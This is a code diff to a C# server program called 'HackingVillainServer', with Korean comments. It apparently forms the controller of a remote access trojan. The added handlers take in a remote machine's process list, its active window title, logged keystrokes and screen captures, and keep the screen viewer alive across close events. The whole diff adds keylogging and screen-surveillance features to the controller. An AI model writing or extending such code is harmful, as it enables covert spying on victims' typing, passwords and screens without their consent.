@@ -60,8 +60,7 @@ namespace HackingVillainServer
 
             this.listView1.Items.Add(client.GetRemoteEndPoint().ToString(), 0);
         }
-
-        Buffer next;
+        
         ScreenViewer viewer;
         Dictionary<int, List<Data>> _dataBuffer = new Dictionary<int, List<Data>>();
 
@@ -99,19 +98,44 @@ namespace HackingVillainServer
 
         public void Got(byte[] bytes, int type)
         {
-            if (type == 7)
+            if (type == 1) // 프로ㅔㅅ스
+            {
+                string processes = Encoding.UTF8.GetString(bytes);
+                EventViewer viewer = new EventViewer(processes.Split('\n').ToList());
+                viewer.Text = "프로세스 목록";
+                this.Invoke((MethodInvoker)delegate ()
+                {
+                    viewer.Show();
+                });
+            }
+            if (type == 2) // 맨 위 창
+            {
+                _clients[0].CurrentWindow = Encoding.UTF8.GetString(bytes);
+            }
+            if (type == 3)
+            {
+                string keys = Encoding.UTF8.GetString(bytes);
+                _clients[0].KeyEvents.Add(keys);
+            }
+            if (type == 7) // 이미지
             {
                 using (var ms = new MemoryStream(bytes))
                 {
                     var img = Image.FromStream(ms);
                     if (viewer != null)
+                    {
                         viewer.BackgroundImage = img;
+                        if (!viewer.Visible)
+                            viewer.Show();
+                    }
                     else
                     {
                         viewer = new ScreenViewer(img);
 
-                        viewer.FormClosed += (b, d) =>
+                        viewer.FormClosing += (b, d) =>
                         {
+                            d.Cancel = true;
+                            viewer.Hide();
                             this.Invoke(new MethodInvoker(() =>
                             {
                                 Send("Stop Showing");
